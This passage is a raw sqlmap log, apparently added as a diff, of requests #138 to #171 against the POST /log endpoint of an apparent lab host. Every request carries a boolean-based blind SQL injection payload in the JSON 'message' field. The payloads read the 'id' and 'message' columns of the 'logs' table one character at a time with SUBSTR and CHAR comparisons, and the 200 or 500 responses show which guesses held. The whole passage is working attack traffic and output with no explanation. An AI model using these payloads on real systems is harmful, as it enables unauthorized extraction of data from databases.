+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:48 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#138]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),24,1)>CHAR(48))||'"}
+
+HTTP response [#138] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:48 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#139]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),25,1)>CHAR(47))||'"}
+
+HTTP response [#139] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:49 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#140]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),25,1)>CHAR(1))||'"}
+
+HTTP response [#140] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:49 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#141]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(65))||'"}
+
+HTTP response [#141] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:49 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#142]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(33))||'"}
+
+HTTP response [#142] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:50 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#143]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(49))||'"}
+
+HTTP response [#143] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:50 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#144]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(41))||'"}
+
+HTTP response [#144] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:51 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#145]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(45))||'"}
+
+HTTP response [#145] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:51 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#146]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(47))||'"}
+
+HTTP response [#146] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:52 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#147]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(48))||'"}
+
+HTTP response [#147] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:52 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#148]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(47))||'"}
+
+HTTP response [#148] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:53 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#149]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(87))||'"}
+
+HTTP response [#149] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:53 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#150]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(67))||'"}
+
+HTTP response [#150] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:53 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#151]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(57))||'"}
+
+HTTP response [#151] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:53 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#152]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(52))||'"}
+
+HTTP response [#152] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:54 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#153]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(49))||'"}
+
+HTTP response [#153] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:54 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#154]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(48))||'"}
+
+HTTP response [#154] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:54 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#155]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 161
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(47))||'"}
+
+HTTP response [#155] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:55 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#156]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 160
+Connection: close
+
+{"message":"test'||(SELECT CHAR(112,120,83,109) WHERE 5730=5730 AND SUBSTR((SELECT COALESCE(CAST(id AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),3,1)>CHAR(1))||'"}
+
+HTTP response [#156] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:55 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#157]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(65))||'"}
+
+HTTP response [#157] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:55 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#158]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(33))||'"}
+
+HTTP response [#158] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:56 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#159]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(49))||'"}
+
+HTTP response [#159] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:56 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#160]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(57))||'"}
+
+HTTP response [#160] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:56 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#161]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(53))||'"}
+
+HTTP response [#161] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:57 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#162]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(51))||'"}
+
+HTTP response [#162] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:57 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#163]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),1,1)>CHAR(52))||'"}
+
+HTTP response [#163] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:58 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#164]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(47))||'"}
+
+HTTP response [#164] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:58 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#165]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(87))||'"}
+
+HTTP response [#165] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:58 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#166]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(67))||'"}
+
+HTTP response [#166] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:59 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#167]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(57))||'"}
+
+HTTP response [#167] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:59 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#168]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(52))||'"}
+
+HTTP response [#168] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#169]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(49))||'"}
+
+HTTP response [#169] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#170]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(50))||'"}
+
+HTTP response [#170] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#171]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),2,1)>CHAR(51))||'"}
+
+HTTP response [#171] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:01 GMT
